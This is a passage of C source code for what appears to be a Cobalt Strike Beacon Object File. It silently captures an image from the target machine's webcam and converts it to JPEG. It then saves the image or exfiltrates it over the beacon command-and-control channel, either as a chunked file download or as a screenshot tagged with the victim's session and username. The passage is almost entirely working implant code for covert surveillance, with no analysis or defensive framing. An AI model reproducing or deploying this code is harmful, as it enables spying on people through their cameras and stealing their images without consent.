//             bw.Write(userName.Length);
//             bw.Write(Encoding.UTF8.GetBytes(userName));
//         }

// var screenshotCallback = new BinaryWriter(new MemoryStream());
//             screenshotCallback.Write(jpgData.Length);
//             screenshotCallback.Write(jpgData);
//             WriteSessionUserNameTitle(screenshotCallback, session, userName, title);
    int messageLength = 4 + jpgLen + 4 + 4 + titleLen + 4 + usernameLen;
    char* packedData = (char*)MSVCRT$malloc(messageLength);

    // //pack on jpgLen/fileSize as 4-byte int second
    packedData[0] = jpgLen & 0xFF;
    packedData[1] = (jpgLen >> 8) & 0xFF;
    packedData[2] = (jpgLen >> 16) & 0xFF;
    packedData[3] = (jpgLen >> 24) & 0xFF;

    int packedIndex = 4;

    // //pack on the bytes of jpg/returnData
    for (int i = 0; i < jpgLen; i++) {
        packedData[packedIndex] = jpg[i];
        packedIndex++;
    }
    
    //pack on session as 4-byte int first
    packedData[packedIndex] = session & 0xFF;
    packedData[packedIndex + 1] = (session >> 8) & 0xFF;
    packedData[packedIndex + 2] = (session >> 16) & 0xFF;
    packedData[packedIndex + 3] = (session >> 24) & 0xFF;

    //pack on titleLength as 4-byte int second
    packedData[packedIndex + 4] = titleLen & 0xFF;
    packedData[packedIndex + 5] = (titleLen >> 8) & 0xFF;
    packedData[packedIndex + 6] = (titleLen >> 16) & 0xFF;
    packedData[packedIndex + 7] = (titleLen >> 24) & 0xFF;
    
    packedIndex += 8;

    //pack on the bytes of title
    for (int i = 0; i < titleLen; i++) {
        packedData[packedIndex] = windowTitle[i];
        packedIndex++;
    }

    //pack on userLength as 4-byte int second
    packedData[packedIndex] = usernameLen & 0xFF;
    packedData[packedIndex + 1] = (usernameLen >> 8) & 0xFF;
    packedData[packedIndex + 2] = (usernameLen >> 16) & 0xFF;
    packedData[packedIndex + 3] = (usernameLen >> 24) & 0xFF;
    
    packedIndex += 4;

    //pack on the bytes of user
    for (int i = 0; i < usernameLen; i++) {
        packedData[packedIndex] = username[i];
        packedIndex++;
    }

    BeaconOutput(CALLBACK_SCREENSHOT, packedData, messageLength);
    return;
}

void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize)
{
    time_t t;
    MSVCRT$srand((unsigned)MSVCRT$time(&t));
    int fileId = MSVCRT$rand();

    int messageLength = downloadFileNameLength + 8;
    char* packedData = (char*)MSVCRT$malloc(messageLength);

    /* Pack fileId (4 bytes) */
    packedData[0] = (fileId >> 24) & 0xFF;
    packedData[1] = (fileId >> 16) & 0xFF;
    packedData[2] = (fileId >> 8) & 0xFF;
    packedData[3] = fileId & 0xFF;

    /* Pack fileSize (4 bytes) */
    packedData[4] = (fileSize >> 24) & 0xFF;
    packedData[5] = (fileSize >> 16) & 0xFF;
    packedData[6] = (fileSize >> 8) & 0xFF;
    packedData[7] = fileSize & 0xFF;

    int packedIndex = 8;
    for (int i = 0; i < downloadFileNameLength; i++) {
        packedData[packedIndex++] = fileName[i];
    }
    BeaconOutput(CALLBACK_FILE, packedData, messageLength);

    int chunkSize = 1024 * 900;
    if (fileSize > chunkSize) {
        int index = 0;
        while (index < fileSize) {
            if (fileSize - index > chunkSize) {
                int chunkLength = 4 + chunkSize;
                char* packedChunk = (char*)MSVCRT$malloc(chunkLength);
                packedChunk[0] = (fileId >> 24) & 0xFF;
                packedChunk[1] = (fileId >> 16) & 0xFF;
                packedChunk[2] = (fileId >> 8) & 0xFF;
                packedChunk[3] = fileId & 0xFF;
                int chunkIndex = 4;
                for (int i = index; i < index + chunkSize; i++) {
                    packedChunk[chunkIndex++] = returnData[i];
                }
                BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
                free(packedChunk);
            }
            else {
                int lastChunkLength = fileSize - index + 4;
                char* lastChunk = (char*)MSVCRT$malloc(lastChunkLength);
                lastChunk[0] = (fileId >> 24) & 0xFF;
                lastChunk[1] = (fileId >> 16) & 0xFF;
                lastChunk[2] = (fileId >> 8) & 0xFF;
                lastChunk[3] = fileId & 0xFF;
                int lastChunkIndex = 4;
                for (int i = index; i < fileSize; i++) {
                    lastChunk[lastChunkIndex++] = returnData[i];
                }
                BeaconOutput(CALLBACK_FILE_WRITE, lastChunk, lastChunkLength);
                free(lastChunk);
            }
            index += chunkSize;
        }
    }
    else {
        int chunkLength = 4 + fileSize;
        char* packedChunk = (char*)MSVCRT$malloc(chunkLength);
        packedChunk[0] = (fileId >> 24) & 0xFF;
        packedChunk[1] = (fileId >> 16) & 0xFF;
        packedChunk[2] = (fileId >> 8) & 0xFF;
        packedChunk[3] = fileId & 0xFF;
        int chunkIndex = 4;
        for (int i = 0; i < fileSize; i++) {
            packedChunk[chunkIndex++] = returnData[i];
        }
        BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
        free(packedChunk);
    }

    char packedClose[4];
    packedClose[0] = (fileId >> 24) & 0xFF;
    packedClose[1] = (fileId >> 16) & 0xFF;
    packedClose[2] = (fileId >> 8) & 0xFF;
    packedClose[3] = fileId & 0xFF;
    BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);

    free(packedData);
}

void go(char* buff, int len) {
    datap parser;
    BeaconDataParse(&parser, buff, len);

    char* filename = BeaconDataExtract(&parser, NULL);
    if (filename == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "BeaconDataExtract returned NULL");
        return;
    }
    int savemethod = BeaconDataInt(&parser);

    if (!ResolveAPIs()) {
        BeaconPrintf(CALLBACK_OUTPUT, "ResolveAPIs failed: %s", filename);
        return;
    }
    if (!ResolveGDIs()) {
        BeaconPrintf(CALLBACK_OUTPUT, "ResolveGDIs failed: %s", filename);
        return;
    }
    
    HRESULT hr = pCoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "pCoInitializeEx failed: %s", filename);
        return;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Initializing webcam");
    CWebcamAccess wa;
    CWebcamAccess_Init(&wa);
    
    hr = CWebcamAccess_Initialize(&wa);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "CWebcamAccess_Initialize failed: %s", filename);
        CWebcamAccess_Destroy(&wa);
        return;
    }

    hr = CWebcamAccess_PrepareDevice(&wa);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "CWebcamAccess_PrepareDevice failed: %s", filename);
        CWebcamAccess_Destroy(&wa);
        return;
    }

    unsigned int width = 0, height = 0;
    CWebcamAccess_GetImageSizes(&wa, &width, &height);
    
    int buflen = width * height * 4;
    BYTE* buf = (BYTE*)malloc(buflen);
    if (!buf) {
        BeaconPrintf(CALLBACK_OUTPUT, "malloc failed: %s", filename);
        CWebcamAccess_Destroy(&wa);
        return;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Capturing image data");
    hr = CWebcamAccess_GetImageData(&wa, buf + (height - 1) * width * 4, width * -4);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "CWebcamAccess_GetImageData failed: %s", filename);
        free(buf);
        CWebcamAccess_Destroy(&wa);
        return;
    }

    BITMAPINFO bmi = {0};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = (int)height;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* pBits = NULL;
    HBITMAP hBitmap = pCreateDIBSection(NULL, &bmi, DIB_RGB_COLORS, &pBits, NULL, 0);
    if (!hBitmap) {
        BeaconPrintf(CALLBACK_OUTPUT, "pCreateDIBSection failed: %s", filename);
        free(buf);
        CWebcamAccess_Destroy(&wa);
        return;
    }

    memcpy(pBits, buf, buflen);

    BYTE* jpegData = NULL;
    DWORD jpegSize = 0;
    int quality = 90;
    if (!BitmapToJpeg(hBitmap, quality, &jpegData, &jpegSize)) {
        BeaconPrintf(CALLBACK_OUTPUT, "BitmapToJpeg failed: %s", filename);
        DeleteObject(hBitmap);
        free(buf);
        CWebcamAccess_Destroy(&wa);
        return;
    }

    if (savemethod == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Saving JPEG to disk with filename %s", filename);
        HANDLE hFile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            BeaconPrintf(CALLBACK_OUTPUT, "CreateFileA failed: %s", filename);
        }
        else {
            DWORD bytesWritten = 0;
            if (!WriteFile(hFile, jpegData, jpegSize, &bytesWritten, NULL)) {
                BeaconPrintf(CALLBACK_OUTPUT, "WriteFile failed: %s", filename);
            }
            CloseHandle(hFile);
        }
    }
    else if (savemethod == 1) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Downloading JPEG over beacon as a file with filename %s", filename);
        downloadFile(filename, (int)strlen(filename), (char*)jpegData, (int)jpegSize);
    }
    else if (savemethod == 2) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Downloading JPEG over beacon as a screenshot");
        DWORD session = -1;
        if (pGetCurrentProcessId && pProcessIdToSessionId) {
            hr = pProcessIdToSessionId(pGetCurrentProcessId(), &session);
            if (FAILED(hr)) {
                BeaconPrintf(CALLBACK_OUTPUT, "pProcessIdToSessionId failed: %s", filename);
            }
        }
        char* user = (char*)pgetenv("USERNAME");
        if (!user) {
            BeaconPrintf(CALLBACK_OUTPUT, "pgetenv failed: %s", filename);
            user = "Unknown";
        }
        char title[] = "Webcam";
        int userLength = MSVCRT$_snprintf(NULL, 0, "%s", user);
        int titleLength = MSVCRT$_snprintf(NULL, 0, "%s", title);
        downloadScreenshot((char*)jpegData, (int)jpegSize, session, title, titleLength, user, userLength);
    }

    DeleteObject(hBitmap);
    free(jpegData);
    free(buf);
    CWebcamAccess_Destroy(&wa);
}





#ifndef BOF
int main(int argc, char* argv[]) {
    return 0;
}
#endif
